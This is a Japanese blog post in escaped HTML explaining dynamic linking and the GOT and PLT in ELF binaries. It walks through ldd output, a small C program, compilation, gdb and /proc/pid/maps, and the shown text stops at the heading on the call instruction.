&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%85%B1%E6%9C%89%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%81%A8%E5%8B%95%E7%9A%84%E3%83%AA%E3%83%B3%E3%82%AF&quot;&gt;共有ライブラリと動的リンク&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%85%B1%E6%9C%89%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E9%96%A2%E6%95%B0%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E3%81%AE%E6%B5%81%E3%82%8C&quot;&gt;共有ライブラリ関数呼び出しの流れ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#got&quot;&gt;GOT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#plt&quot;&gt;PLT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#got%E3%81%A8plt%E3%81%AE%E5%8B%95%E3%81%8D%E3%82%92%E8%BF%BD%E3%81%86&quot;&gt;GOTとPLTの動きを追う&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E3%81%A8%E3%83%93%E3%83%AB%E3%83%89&quot;&gt;ソースコードとビルド&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E5%87%BA%E5%8A%9B&quot;&gt;仮想メモリの出力&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#call%E5%91%BD%E4%BB%A4&quot;&gt;call命令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%85%B1%E6%9C%89%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E9%96%A2%E6%95%B0%E3%81%AE%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97&quot;&gt;共有ライブラリ関数の呼び出し&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;共有ライブラリと動的リンク&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%85%B1%E6%9C%89%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%81%A8%E5%8B%95%E7%9A%84%E3%83%AA%E3%83%B3%E3%82%AF&quot; aria-label=&quot;共有ライブラリと動的リンク permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;共有ライブラリと動的リンク&lt;/h2&gt;
&lt;p&gt;多くのELFバイナリではライブラリ関数(あらかじめ定義されているよく使う便利な関数)が動的リンクによってリンクされています。&lt;/p&gt;
&lt;p&gt;動的リンクとは、プログラムの実行に必要なライブラリ関数などの本体を、プログラムの実行時にリンクする仕組みのことです。&lt;/p&gt;
&lt;p&gt;動的リンクと対になる方式としては、必要なライブラリ関数などをすべて1つのプログラムにあらかじめリンクしておく静的リンクがあります。&lt;/p&gt;
&lt;p&gt;ライブラリ関数などのように複数のプログラムが共通して使用する関数やモジュールを動的リンクにすることで、プログラム自体のファイルサイズの削減や、実行時のメモリ使用量を効率化できるといったメリットがあります。&lt;/p&gt;
&lt;p&gt;ELFバイナリがどの共有ライブラリに依存しているかは、&lt;code class=&quot;language-text&quot;&gt;ldd&lt;/code&gt;コマンドで調べることができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ldd test.o
	linux-vdso.so.1 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x00007ffdb417f000&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; /lib/x86_64-linux-gnu/libc.so.6 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x00007f02af5ca000&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	/lib64/ld-linux-x86-64.so.2 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0x00007f02af7d7000&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://linuxjm.osdn.jp/html/ld.so/man1/ldd.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Man page of LDD&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この記事では、動的リンクされた共有ライブラリをプログラムの実行時にリンクする仕組みについてまとめます。&lt;/p&gt;
&lt;h2 id=&quot;共有ライブラリ関数呼び出しの流れ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%85%B1%E6%9C%89%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E9%96%A2%E6%95%B0%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E3%81%AE%E6%B5%81%E3%82%8C&quot; aria-label=&quot;共有ライブラリ関数呼び出しの流れ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;共有ライブラリ関数呼び出しの流れ&lt;/h2&gt;
&lt;p&gt;ライブラリ関数が動的リンクされたELFバイナリを実行する場合、ライブラリ関数は実際に処理の中で呼び出されるタイミングまでバインドされません。&lt;/p&gt;
&lt;p&gt;このような仕組みは遅延バインドと呼ばれ、PLT(Procedure Linkage Table)によってサポートされます。&lt;/p&gt;
&lt;p&gt;プログラムの実行時に共有ライブラリ関数が呼び出されるとき、最初に呼び出されるアドレスは共有ライブラリ関数の実態ではなく、&lt;code class=&quot;language-text&quot;&gt;.plt&lt;/code&gt;セクションのエントリになります。&lt;/p&gt;
&lt;p&gt;呼び出されたPLTのエントリは、その後GOT(Global Offset Table)と呼ばれる領域にジャンプします。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3zwc6Y6&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解セキュリティコンテスト&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;got&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#got&quot; aria-label=&quot;got permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GOT&lt;/h2&gt;
&lt;p&gt;GOT(Global Offset Table)はELFファイルとしてコンパイルされたプログラムを正しく実行できるようにするために使用されるコンピュータプログラム（実行可能ファイルおよび共有ライブラリ）メモリのセクションを指します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Global_Offset_Table&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Global Offset Table - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;簡潔に言うと、GOTはライブラリ関数のアドレス一覧を保持するための領域です。&lt;/p&gt;
&lt;p&gt;この領域は、プログラムの実行時に使用するライブラリ関数のアドレスが設定されます。&lt;/p&gt;
&lt;p&gt;GOTによて、ライブラリ関数をプロセスメモリ空間の中に再配置することが容易になります。&lt;/p&gt;
&lt;h2 id=&quot;plt&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#plt&quot; aria-label=&quot;plt permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PLT&lt;/h2&gt;
&lt;p&gt;PLT(Procedure Linkage Table)は、ライブラリ関数を呼び出すための小さなコードの集合です。&lt;/p&gt;
&lt;p&gt;PLTには、GOTが保持するライブラリ関数と同数のコードが配置されています。&lt;/p&gt;
&lt;p&gt;PLTの持つコードの挙動は、GOTに設定されている値にジャンプすることです。&lt;/p&gt;
&lt;p&gt;PLTのコードが呼び出されたとき、GOTにまだ呼び出し先の関数のアドレスが設定されていない場合は、アドレスをGOTに設定してからジャンプを行います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://keichi.dev/post/plt-and-got/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;PLTとGOTってなんだっけ · Keichi Takahashi&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;gotとpltの動きを追う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#got%E3%81%A8plt%E3%81%AE%E5%8B%95%E3%81%8D%E3%82%92%E8%BF%BD%E3%81%86&quot; aria-label=&quot;gotとpltの動きを追う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GOTとPLTの動きを追う&lt;/h2&gt;
&lt;p&gt;ここからは、実際にGDBを使ってメモリマップを見ていきます。&lt;/p&gt;
&lt;h3 id=&quot;ソースコードとビルド&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E3%81%A8%E3%83%93%E3%83%AB%E3%83%89&quot; aria-label=&quot;ソースコードとビルド permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ソースコードとビルド&lt;/h3&gt;
&lt;p&gt;今回検証に使用するのは以下のコードです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; b&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次のコマンドでコンパイルし、gdbで起動しておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;gcc -fcf-protection&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;none -no-pie -g test.c -o test.o
gdb ./test.o&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;仮想メモリの出力&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E5%87%BA%E5%8A%9B&quot; aria-label=&quot;仮想メモリの出力 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;仮想メモリの出力&lt;/h3&gt;
&lt;p&gt;Linuxには、現在稼働しているプロセスのための疑似ディレクトリとして&lt;code class=&quot;language-text&quot;&gt;/proc&lt;/code&gt;ディレクトリが容易されています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/proc&lt;/code&gt;ディレクトリの直下には稼働中のプロセスのPIDに対応した数字のディレクトリがあり、その中にプロセス制御テーブルがマッピングされています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://uralowl.my.coocan.jp/unix/job/ORACLE/oracle/pmap_linux.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;プロセスのメモリマップについて (Linux)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/1401359/understanding-linux-proc-pid-maps-or-proc-self-maps&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;embedded - Understanding Linux /proc/pid/maps or /proc/self/maps - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は、プロセスのメモリマップを確認するため、以下のコマンドを使用しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /proc/&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;pidof test.o&lt;span class=&quot;token variable&quot;&gt;`&lt;/span&gt;&lt;/span&gt;/maps
address           	permission offset   device inode   				   pathname
00400000-00401000 r--p 00000000 fd:00 &lt;span class=&quot;token number&quot;&gt;786517&lt;/span&gt;                             /home/ubuntu/gottest/test.o
00401000-00402000 r-xp 00001000 fd:00 &lt;span class=&quot;token number&quot;&gt;786517&lt;/span&gt;                             /home/ubuntu/gottest/test.o
00402000-00403000 r--p 00002000 fd:00 &lt;span class=&quot;token number&quot;&gt;786517&lt;/span&gt;                             /home/ubuntu/gottest/test.o
00403000-00404000 r--p 00002000 fd:00 &lt;span class=&quot;token number&quot;&gt;786517&lt;/span&gt;                             /home/ubuntu/gottest/test.o
00404000-00405000 rw-p 00003000 fd:00 &lt;span class=&quot;token number&quot;&gt;786517&lt;/span&gt;                             /home/ubuntu/gottest/test.o
7ffff7dc3000-7ffff7de8000 r--p 00000000 fd:00 &lt;span class=&quot;token number&quot;&gt;945235&lt;/span&gt;                     /lib/x86_64-linux-gnu/libc-2.31.so
7ffff7de8000-7ffff7f60000 r-xp 00025000 fd:00 &lt;span class=&quot;token number&quot;&gt;945235&lt;/span&gt;                     /lib/x86_64-linux-gnu/libc-2.31.so
7ffff7f60000-7ffff7faa000 r--p 0019d000 fd:00 &lt;span class=&quot;token number&quot;&gt;945235&lt;/span&gt;                     /lib/x86_64-linux-gnu/libc-2.31.so
7ffff7faa000-7ffff7fab000 ---p 001e7000 fd:00 &lt;span class=&quot;token number&quot;&gt;945235&lt;/span&gt;                     /lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fab000-7ffff7fae000 r--p 001e7000 fd:00 &lt;span class=&quot;token number&quot;&gt;945235&lt;/span&gt;                     /lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fae000-7ffff7fb1000 rw-p 001ea000 fd:00 &lt;span class=&quot;token number&quot;&gt;945235&lt;/span&gt;                     /lib/x86_64-linux-gnu/libc-2.31.so
7ffff7fb1000-7ffff7fb7000 rw-p 00000000 00:00 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; 
7ffff7fcb000-7ffff7fce000 r--p 00000000 00:00 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;                          &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;vvar&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
7ffff7fce000-7ffff7fcf000 r-xp 00000000 00:00 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;                          &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;vdso&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
7ffff7fcf000-7ffff7fd0000 r--p 00000000 fd:00 &lt;span class=&quot;token number&quot;&gt;945231&lt;/span&gt;                     /lib/x86_64-linux-gnu/ld-2.31.so
7ffff7fd0000-7ffff7ff3000 r-xp 00001000 fd:00 &lt;span class=&quot;token number&quot;&gt;945231&lt;/span&gt;                     /lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ff3000-7ffff7ffb000 r--p 00024000 fd:00 &lt;span class=&quot;token number&quot;&gt;945231&lt;/span&gt;                     /lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffc000-7ffff7ffd000 r--p 0002c000 fd:00 &lt;span class=&quot;token number&quot;&gt;945231&lt;/span&gt;                     /lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffd000-7ffff7ffe000 rw-p 0002d000 fd:00 &lt;span class=&quot;token number&quot;&gt;945231&lt;/span&gt;                     /lib/x86_64-linux-gnu/ld-2.31.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;                          &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;stack&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;                  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;vsyscall&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;maps&lt;/code&gt;は、プロセスまたはスレッド内の連続する仮想メモリの領域を示しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;address&lt;/code&gt;にはプロセスのアドレス空間内の領域の開始アドレスと終了アドレスが、&lt;code class=&quot;language-text&quot;&gt;permission&lt;/code&gt;にはその領域の権限が記録されています。&lt;/p&gt;
&lt;p&gt;上記の結果から、この&lt;code class=&quot;language-text&quot;&gt;/lib/x86_64-linux-gnu/libc-2.31.so&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;/lib/x86_64-linux-gnu/ld-2.31.so&lt;/code&gt;の2つの共有ライブラリが使用されていることがわかります。&lt;/p&gt;
&lt;p&gt;ここで、共有ライブラリ&lt;code class=&quot;language-text&quot;&gt;/lib/x86_64-linux-gnu/ld-2.31.so&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;7ffff7fcf000&lt;/code&gt;にマッピングされていますが、これは固定されたアドレスではありません。&lt;/p&gt;
&lt;p&gt;共有ライブラリが展開されるメモリアドレスは、プログラムの実行時に決定され、場合によっては異なるアドレスに展開されることもあります。&lt;/p&gt;
&lt;p&gt;ここで、プログラムの実行時に、共有ライブラリが実際にどのメモリアドレスに展開されたのかを調べて呼び出すための仕組みがPLTとGOTです。&lt;/p&gt;
&lt;h3 id=&quot;call命令&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#call%E5%91%BD%E4%BB%A4&quot; aria-label=&quot;call命令 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;call命令&lt;/h3&gt;
